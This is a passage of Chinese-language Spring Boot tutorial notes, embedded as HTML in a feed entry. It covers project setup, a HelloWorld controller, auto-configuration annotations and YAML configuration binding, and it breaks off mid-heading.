      <content type="html"><![CDATA[<h1 id="一、Spring-Boot-入门"><a href="#一、Spring-Boot-入门" class="headerlink" title="一、Spring Boot 入门"></a><strong>一、</strong>Spring Boot 入门</h1><h2 id="1、Spring-Boot-简介"><a href="#1、Spring-Boot-简介" class="headerlink" title="1、Spring Boot 简介"></a>1、Spring Boot 简介</h2><blockquote><p>简化Spring应用开发的一个框架；</p><p>整个Spring技术栈的一个大整合；</p><p>J2EE开发的一站式解决方案；</p></blockquote><h2 id="2、微服务"><a href="#2、微服务" class="headerlink" title="2、微服务"></a>2、微服务</h2><p>2014，martin fowler</p><p>微服务：架构风格（服务微化）</p><p>一个应用应该是一组小型服务；可以通过HTTP的方式进行互通；</p><p>单体应用：ALL IN ONE</p><p>微服务：每一个功能元素最终都是一个可独立替换和独立升级的软件单元；</p><p><a href="https://martinfowler.com/articles/microservices.html#MicroservicesAndSoa">详细参照微服务文档</a></p><h2 id="3、环境准备"><a href="#3、环境准备" class="headerlink" title="3、环境准备"></a>3、环境准备</h2><p><a href="http://www.gulixueyuan.com/">http://www.gulixueyuan.com/</a> 谷粒学院</p><p>环境约束</p><p>–jdk1.8：Spring Boot 推荐jdk1.7及以上；java version “1.8.0_112”</p><p>–maven3.x：maven 3.3以上版本；Apache Maven 3.3.9</p><p>–IntelliJIDEA2017：IntelliJ IDEA 2017.2.2 x64、STS</p><p>–SpringBoot 1.5.9.RELEASE：1.5.9；</p><p>统一环境；</p><h3 id="1、MAVEN设置；"><a href="#1、MAVEN设置；" class="headerlink" title="1、MAVEN设置；"></a>1、MAVEN设置；</h3><p>给maven 的settings.xml配置文件的profiles标签添加</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span>&gt;</span>jdk-1.8<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">activation</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">activeByDefault</span>&gt;</span>true<span class="tag">&lt;/<span class="name">activeByDefault</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">jdk</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">activation</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.compilerVersion</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.compilerVersion</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h3 id="2、IDEA设置"><a href="#2、IDEA设置" class="headerlink" title="2、IDEA设置"></a>2、IDEA设置</h3><p>整合maven进来；</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/59173/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180129151045.png" alt="idea设置"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/59173/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180129151112.png" alt="images/"></p><h2 id="4、Spring-Boot-HelloWorld"><a href="#4、Spring-Boot-HelloWorld" class="headerlink" title="4、Spring Boot HelloWorld"></a>4、Spring Boot HelloWorld</h2><p>一个功能：</p><p>浏览器发送hello请求，服务器接受请求并处理，响应Hello World字符串；</p><h3 id="1、创建一个maven工程；（jar）"><a href="#1、创建一个maven工程；（jar）" class="headerlink" title="1、创建一个maven工程；（jar）"></a>1、创建一个maven工程；（jar）</h3><h3 id="2、导入spring-boot相关的依赖"><a href="#2、导入spring-boot相关的依赖" class="headerlink" title="2、导入spring boot相关的依赖"></a>2、导入spring boot相关的依赖</h3><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.9.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h3 id="3、编写一个主程序；启动Spring-Boot应用"><a href="#3、编写一个主程序；启动Spring-Boot应用" class="headerlink" title="3、编写一个主程序；启动Spring Boot应用"></a>3、编写一个主程序；启动Spring Boot应用</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  <span class="doctag">@SpringBootApplication</span> 来标注一个主程序类，说明这是一个Spring Boot应用</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorldMainApplication</span> {</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Spring应用启动起来</span></span><br><span class="line">        SpringApplication.run(HelloWorldMainApplication.class,args);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="4、编写相关的Controller、Service"><a href="#4、编写相关的Controller、Service" class="headerlink" title="4、编写相关的Controller、Service"></a>4、编写相关的Controller、Service</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> {</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping("/hello")</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello World!"</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="5、运行主程序测试"><a href="#5、运行主程序测试" class="headerlink" title="5、运行主程序测试"></a>5、运行主程序测试</h3><h3 id="6、简化部署"><a href="#6、简化部署" class="headerlink" title="6、简化部署"></a>6、简化部署</h3><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 这个插件，可以将应用打包成一个可执行的jar包；--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>将这个应用打成jar包，直接使用java -jar的命令进行执行；</p><h2 id="5、Hello-World探究"><a href="#5、Hello-World探究" class="headerlink" title="5、Hello World探究"></a>5、Hello World探究</h2><h3 id="1、POM文件"><a href="#1、POM文件" class="headerlink" title="1、POM文件"></a>1、POM文件</h3><h4 id="1、父项目"><a href="#1、父项目" class="headerlink" title="1、父项目"></a>1、父项目</h4><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.9.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line">他的父项目是</span><br><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.9.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">relativePath</span>&gt;</span>../../spring-boot-dependencies<span class="tag">&lt;/<span class="name">relativePath</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">他来真正管理Spring Boot应用里面的所有依赖版本；</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>Spring Boot的版本仲裁中心；</p><p>以后我们导入依赖默认是不需要写版本；（没有在dependencies里面管理的依赖自然需要声明版本号）</p><h4 id="2、启动器"><a href="#2、启动器" class="headerlink" title="2、启动器"></a>2、启动器</h4><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p><strong>spring-boot-starter</strong>-==web==：</p><p>​    spring-boot-starter：spring-boot场景启动器；帮我们导入了web模块正常运行所依赖的组件；</p><p>Spring Boot将所有的功能场景都抽取出来，做成一个个的starters（启动器），只需要在项目里面引入这些starter相关场景的所有依赖都会导入进来。要用什么功能就导入什么场景的启动器</p><h3 id="2、主程序类，主入口类"><a href="#2、主程序类，主入口类" class="headerlink" title="2、主程序类，主入口类"></a>2、主程序类，主入口类</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  <span class="doctag">@SpringBootApplication</span> 来标注一个主程序类，说明这是一个Spring Boot应用</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorldMainApplication</span> {</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Spring应用启动起来</span></span><br><span class="line">        SpringApplication.run(HelloWorldMainApplication.class,args);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>@<strong>SpringBootApplication</strong>:    Spring Boot应用标注在某个类上说明这个类是SpringBoot的主配置类，SpringBoot就应该运行这个类的main方法来启动SpringBoot应用；</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Target(ElementType.TYPE)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Inherited</span></span><br><span class="line"><span class="meta">@SpringBootConfiguration</span></span><br><span class="line"><span class="meta">@EnableAutoConfiguration</span></span><br><span class="line"><span class="meta">@ComponentScan(excludeFilters = {</span></span><br><span class="line"><span class="meta">      @Filter(type = FilterType.CUSTOM, classes = TypeExcludeFilter.class),</span></span><br><span class="line"><span class="meta">      @Filter(type = FilterType.CUSTOM, classes = AutoConfigurationExcludeFilter.class) })</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> SpringBootApplication {</span><br></pre></td></tr></tbody></table></figure><p>@<strong>SpringBootConfiguration</strong>:Spring Boot的配置类；</p><p>​        标注在某个类上，表示这是一个Spring Boot的配置类；</p><p>​        @<strong>Configuration</strong>:配置类上来标注这个注解；</p><p>​            配置类 —–  配置文件；配置类也是容器中的一个组件；@Component</p><p>@<strong>EnableAutoConfiguration</strong>：开启自动配置功能；</p><p>​        以前我们需要配置的东西，Spring Boot帮我们自动配置；@<strong>EnableAutoConfiguration</strong>告诉SpringBoot开启自动配置功能；这样自动配置才能生效；</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@AutoConfigurationPackage</span></span><br><span class="line"><span class="meta">@Import(EnableAutoConfigurationImportSelector.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> EnableAutoConfiguration {</span><br></pre></td></tr></tbody></table></figure><p>​          @<strong>AutoConfigurationPackage</strong>：自动配置包</p><p>​        @<strong>Import</strong>(AutoConfigurationPackages.Registrar.class)：</p><p>​        Spring的底层注解@Import，给容器中导入一个组件；导入的组件由AutoConfigurationPackages.Registrar.class；</p><p>==将主配置类（@SpringBootApplication标注的类）的所在包及下面所有子包里面的所有组件扫描到Spring容器；==</p><p>​    @<strong>Import</strong>(EnableAutoConfigurationImportSelector.class)；</p><p>​        给容器中导入组件？</p><p>​        <strong>EnableAutoConfigurationImportSelector</strong>：导入哪些组件的选择器；</p><p>​        将所有需要导入的组件以全类名的方式返回；这些组件就会被添加到容器中；</p><p>​        会给容器中导入非常多的自动配置类（xxxAutoConfiguration）；就是给容器中导入这个场景需要的所有组件，并配置好这些组件；        <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/59173/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180129224104.png" alt="自动配置类"></p><p>有了自动配置类，免去了我们手动编写配置注入功能组件等的工作；</p><p>​        SpringFactoriesLoader.loadFactoryNames(EnableAutoConfiguration.class,classLoader)；</p><p>==Spring Boot在启动的时候从类路径下的META-INF/spring.factories中获取EnableAutoConfiguration指定的值，将这些值作为自动配置类导入到容器中，自动配置类就生效，帮我们进行自动配置工作；==以前我们需要自己配置的东西，自动配置类都帮我们；</p><p>J2EE的整体整合解决方案和自动配置都在spring-boot-autoconfigure-1.5.9.RELEASE.jar；</p><p>​        </p><p>==Spring注解版（谷粒学院）==</p><h2 id="6、使用Spring-Initializer快速创建Spring-Boot项目"><a href="#6、使用Spring-Initializer快速创建Spring-Boot项目" class="headerlink" title="6、使用Spring Initializer快速创建Spring Boot项目"></a>6、使用Spring Initializer快速创建Spring Boot项目</h2><h3 id="1、IDEA：使用-Spring-Initializer快速创建项目"><a href="#1、IDEA：使用-Spring-Initializer快速创建项目" class="headerlink" title="1、IDEA：使用 Spring Initializer快速创建项目"></a>1、IDEA：使用 Spring Initializer快速创建项目</h3><p>IDE都支持使用Spring的项目创建向导快速创建一个Spring Boot项目；</p><p>选择我们需要的模块；向导会联网创建Spring Boot项目；</p><p>默认生成的Spring Boot项目；</p><ul><li>主程序已经生成好了，我们只需要我们自己的逻辑</li><li>resources文件夹中目录结构<ul><li>static：保存所有的静态资源； js css  images；</li><li>templates：保存所有的模板页面；（Spring Boot默认jar包使用嵌入式的Tomcat，默认不支持JSP页面）；可以使用模板引擎（freemarker、thymeleaf）；</li><li>application.properties：Spring Boot应用的配置文件；可以修改一些默认设置；</li></ul></li></ul><h3 id="2、STS使用-Spring-Starter-Project快速创建项目"><a href="#2、STS使用-Spring-Starter-Project快速创建项目" class="headerlink" title="2、STS使用 Spring Starter Project快速创建项目"></a>2、STS使用 Spring Starter Project快速创建项目</h3><hr><h1 id="二、配置文件"><a href="#二、配置文件" class="headerlink" title="二、配置文件"></a>二、配置文件</h1><h2 id="1、配置文件"><a href="#1、配置文件" class="headerlink" title="1、配置文件"></a>1、配置文件</h2><p>SpringBoot使用一个全局的配置文件，配置文件名是固定的；</p><p>•application.properties</p><p>•application.yml</p><p>配置文件的作用：修改SpringBoot自动配置的默认值；SpringBoot在底层都给我们自动配置好；</p><p>YAML（YAML Ain’t Markup Language）</p><p>​    YAML  A Markup Language：是一个标记语言</p><p>​    YAML   isn’t Markup Language：不是一个标记语言；</p><p>标记语言：</p><p>​    以前的配置文件；大多都使用的是  <strong>xxxx.xml</strong>文件；</p><p>​    YAML：<strong>以数据为中心</strong>，比json、xml等更适合做配置文件；</p><p>​    YAML：配置例子</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8081</span></span><br></pre></td></tr></tbody></table></figure><p>​    XML：</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">server</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">port</span>&gt;</span>8081<span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">server</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h2 id="2、YAML语法："><a href="#2、YAML语法：" class="headerlink" title="2、YAML语法："></a>2、YAML语法：</h2><h3 id="1、基本语法"><a href="#1、基本语法" class="headerlink" title="1、基本语法"></a>1、基本语法</h3><p>k:(空格)v：表示一对键值对（空格必须有）；</p><p>以<strong>空格</strong>的缩进来控制层级关系；只要是左对齐的一列数据，都是同一个层级的</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">8081</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">/hello</span></span><br></pre></td></tr></tbody></table></figure><p>属性和值也是大小写敏感；</p><h3 id="2、值的写法"><a href="#2、值的写法" class="headerlink" title="2、值的写法"></a>2、值的写法</h3><h4 id="字面量：普通的值（数字，字符串，布尔）"><a href="#字面量：普通的值（数字，字符串，布尔）" class="headerlink" title="字面量：普通的值（数字，字符串，布尔）"></a>字面量：普通的值（数字，字符串，布尔）</h4><p>​    k: v：字面直接来写；</p><p>​        字符串默认不用加上单引号或者双引号；</p><p>​        “”：双引号；不会转义字符串里面的特殊字符；特殊字符会作为本身想表示的意思</p><p>​                name:   “zhangsan \n lisi”：输出；zhangsan 换行  lisi</p><p>​        ‘’：单引号；会转义特殊字符，特殊字符最终只是一个普通的字符串数据</p><p>​                name:   ‘zhangsan \n lisi’：输出；zhangsan \n  lisi</p><h4 id="对象、Map（属性和值）（键值对）："><a href="#对象、Map（属性和值）（键值对）：" class="headerlink" title="对象、Map（属性和值）（键值对）："></a>对象、Map（属性和值）（键值对）：</h4><p>​    k: v：在下一行来写对象的属性和值的关系；注意缩进</p><p>​        对象还是k: v的方式</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">friends:</span></span><br><span class="line"><span class="attr">lastName:</span> <span class="string">zhangsan</span></span><br><span class="line"><span class="attr">age:</span> <span class="number">20</span></span><br></pre></td></tr></tbody></table></figure><p>行内写法：</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">friends:</span> {<span class="attr">lastName:</span> <span class="string">zhangsan</span>,<span class="attr">age:</span> <span class="number">18</span>}</span><br></pre></td></tr></tbody></table></figure><h4 id="数组（List、Set）："><a href="#数组（List、Set）：" class="headerlink" title="数组（List、Set）："></a>数组（List、Set）：</h4><p>用- 值表示数组中的一个元素</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">pets:</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">cat</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">dog</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">pig</span></span><br></pre></td></tr></tbody></table></figure><p>行内写法</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">pets:</span> [<span class="string">cat</span>,<span class="string">dog</span>,<span class="string">pig</span>]</span><br></pre></td></tr></tbody></table></figure><h2 id="3、配置文件值注入"><a href="#3、配置文件值注入" class="headerlink" title="3、配置文件值注入"></a>3、配置文件值注入</h2><p>配置文件</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">person:</span></span><br><span class="line">    <span class="attr">lastName:</span> <span class="string">hello</span></span><br><span class="line">    <span class="attr">age:</span> <span class="number">18</span></span><br><span class="line">    <span class="attr">boss:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">birth:</span> <span class="number">2017</span><span class="string">/12/12</span></span><br><span class="line">    <span class="attr">maps:</span> {<span class="attr">k1:</span> <span class="string">v1</span>,<span class="attr">k2:</span> <span class="number">12</span>}</span><br><span class="line">    <span class="attr">lists:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">lisi</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">zhaoliu</span></span><br><span class="line">    <span class="attr">dog:</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">小狗</span></span><br><span class="line">      <span class="attr">age:</span> <span class="number">12</span></span><br></pre></td></tr></tbody></table></figure><p>javaBean：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将配置文件中配置的每一个属性的值，映射到这个组件中</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@ConfigurationProperties</span>：告诉SpringBoot将本类中的所有属性和配置文件中相关的配置进行绑定；</span></span><br><span class="line"><span class="comment"> *      prefix = "person"：配置文件中哪个下面的所有属性进行一一映射</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 只有这个组件是容器中的组件，才能容器提供的<span class="doctag">@ConfigurationProperties</span>功能；</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = "person")</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> {</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String lastName;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> Boolean boss;</span><br><span class="line">    <span class="keyword">private</span> Date birth;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,Object&gt; maps;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Object&gt; lists;</span><br><span class="line">    <span class="keyword">private</span> Dog dog;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>我们可以导入配置文件处理器，以后编写配置就有提示了</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--导入配置文件处理器，配置文件进行绑定就会有提示--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-configuration-processor<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h4 id="1、properties配置文件在idea中默认utf-8可能会乱码"><a href="#1、properties配置文件在idea中默认utf-8可能会乱码" class="headerlink" 